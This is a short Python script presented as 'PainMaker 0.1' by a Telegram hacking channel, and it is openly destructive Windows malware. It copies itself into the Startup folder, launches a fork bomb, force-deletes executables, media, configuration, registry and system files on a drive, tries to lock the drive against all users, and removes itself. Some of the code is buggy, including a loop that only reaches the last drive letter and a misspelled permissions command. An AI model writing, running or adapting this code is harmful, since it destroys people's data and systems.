import os #using commands
from os import remove #remove itself
import subprocess #using commands
from time import time #timing 
import shutil #reproduce

shutil.copy(__file__,'C:\\Users\\Tabesh\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\painmaker.py') #reproduce on startup Folder
os.system("%0|%0") #Cpu Fill
#Remove files--------------------------------------
list = ["e","w","c","f","d","y","u","i","o","p","l","k","j","h","g","r","t","s","a","z","x","q","v","b","n","m"] #drives list

for d in list:
    drive = d
os.system("del "+drive+":\*.* /f /f /q") #del .exe
os.system("del "+drive+":\*.mp3 /f /f /q") #del .mp3
os.system("del "+drive+":\*.mp4 /f /f /q") #del .mp4
os.system("del "+drive+":\*.psd /f /f /q") #del .psd
os.system("del "+drive+":\*.mkv /f /f /q") #del .mkv
os.system("del "+drive+":\*.txt /f /f /q") #del .txt
os.system("del "+drive+":\*.xml /f /f /q") #del .xml
os.system("del "+drive+":\*.config /f /f /q") #del .config
os.system("del "+drive+":\*.reg /f /f /q") #del .reg
os.system("del "+drive+":\*.sys /f /f /q") #del .sys
os.system("del "+drive+":\*.inf /f /f /q") #del .inf

#---------------------------------------------------
os.system("Cals "+drive+": /e /p everyone:n") # Lock all drives
#Remove itself--------------------------------------
remove('painmaker.py')
#PainMaker 0.1 [beta] coded by t.me/Hackers_channel7.
